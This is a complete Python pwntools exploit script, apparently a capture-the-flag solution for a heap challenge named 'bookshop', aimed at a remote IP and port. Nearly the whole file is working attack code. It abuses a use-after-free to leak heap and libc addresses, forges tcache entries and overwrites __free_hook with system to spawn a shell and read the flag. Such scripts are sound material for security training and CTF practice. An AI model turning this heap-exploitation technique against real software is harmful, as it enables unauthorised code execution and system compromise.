# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './bookshop'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
# context.log_level = 'debug' 
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '123.57.207.81'
    port = '21132'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
uu64= lambda a          : u64(p.recv(a).ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def boom( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>',num)

def add(content):
    cmd(1)
    sa('> ',content)

def delete(idx):
    cmd(2)
    sla('bag?',idx)

def show(idx):
    cmd(3)
    sla('read?',idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    sla('number?' , 0x78)
    for i in range( 9 ):
        add(flat(0,0x441)*4) #8

    for i in range(8):
        delete(i)

    show(1)

    ru('Content: ')
    heap_base = u64(p.recv(6).ljust(8,'\x00')) & 0xfffffffff000
    lg('heap_base',heap_base)

    # $rebase(0x0000000000004060)

    delete(8)
    delete(7)

    for i in range(7):
        add('\x00') #15

    add(p64(heap_base + 0x2c0)) #16

    add(flat(0 , 0x21)*7) #17
    add('\x00') #18

    fake_tcache = p16(7)*0x28
    add(fake_tcache) #19

    delete(19)
    show(19)

    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()

    lg('__free_hook',__free_hook)

    add('\x00') #20
    delete(3)
    delete(1)
    delete(20)
    add(flat(__free_hook - 8)*0xf) #21
    # dbg()

    add('\x00') #22
    add( flat('/bin/sh\x00' , system_addr) ) #23
    delete(23)

    # dbg()


    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   bookshop.py
@Time    :   2021/12/11 14:03:00
@Author  :   Niyah 
'''